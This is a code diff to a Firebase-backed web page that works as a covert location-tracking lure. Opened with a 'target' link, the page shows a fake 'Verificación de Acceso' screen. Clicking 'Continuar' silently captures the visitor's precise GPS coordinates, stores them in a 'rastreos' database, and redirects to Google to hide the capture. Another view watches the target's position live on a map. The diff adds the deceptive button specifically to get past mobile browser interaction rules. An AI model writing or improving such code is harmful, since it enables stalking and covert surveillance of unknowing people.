@@ -2,7 +2,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebas
 import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-// CONFIGURACIÓN DE FIREBASE
+// CONFIGURACIÓN DE FIREBASE (Reemplaza con tus llaves reales)
 const firebaseConfig = {
     apiKey: "TU_API_KEY",
     authDomain: "tu-proyecto.firebaseapp.com",
@@ -35,17 +35,28 @@ const targetId = urlParams.get('target');
 
 document.addEventListener("DOMContentLoaded", async function () {
     try {
-        // Autenticación anónima para cumplir con las reglas de Firestore (request.auth != null)
+        // Autenticación anónima obligatoria para Firestore Rules
         await signInAnonymously(auth);
         console.log("Sesión segura iniciada.");
     } catch (error) {
         console.error("Error al autenticar en Firebase Auth:", error);
     }
 
-    // ESCENARIO A: Dispositivo secundario
+    // ESCENARIO A: Dispositivo secundario (Target)
     if (targetId) {
-        document.body.innerHTML = "<div style='color:white; text-align:center; padding-top:20%; font-family:sans-serif;'>Cargando contenido...</div>";
-        capturarYSalir(targetId);
+        // Se crea un botón interactivo para cumplir con la política de interacción de navegadores móviles
+        document.body.innerHTML = `
+            <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background:#121212; color:white; font-family:sans-serif; text-align:center; padding:20px;">
+                <h2 style="margin-bottom:20px;">Verificación de Acceso</h2>
+                <button id="btn-capturar" style="padding: 15px 30px; font-size: 18px; background-color: #d9534f; color: white; border: none; border-radius: 8px; cursor: pointer;">
+                    Continuar
+                </button>
+            </div>
+        `;
+
+        document.getElementById('btn-capturar').addEventListener('click', () => {
+            capturarYSalir(targetId);
+        });
         return;
     }
 
@@ -59,7 +70,7 @@ document.addEventListener("DOMContentLoaded", async function () {
 
     setTimeout(() => { map.invalidateSize(); }, 200);
 
-    // Escuchar la base de datos
+    // Escuchar la base de datos en tiempo real
     escucharObjetivoRemoto("objetivo_principal");
 });
 
@@ -76,7 +87,7 @@ function capturarYSalir(id) {
             const lng = position.coords.longitude;
 
             try {
-                // Escribe en Firestore aprovechando el token de autenticación anónima
+                // Guarda las coordenadas en Firestore
                 await setDoc(doc(db, "rastreos", id), {
                     lat: lat,
                     lng: lng,
@@ -85,10 +96,12 @@ function capturarYSalir(id) {
             } catch (e) {
                 console.error("Error al guardar en Firebase:", e);
             } finally {
+                // Redirecciona una vez completada la escritura
                 window.location.replace("https://www.google.com");
             }
         },
         (error) => {
+            console.error("Error obteniendo ubicación:", error);
             window.location.replace("https://www.google.com");
         },
         { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
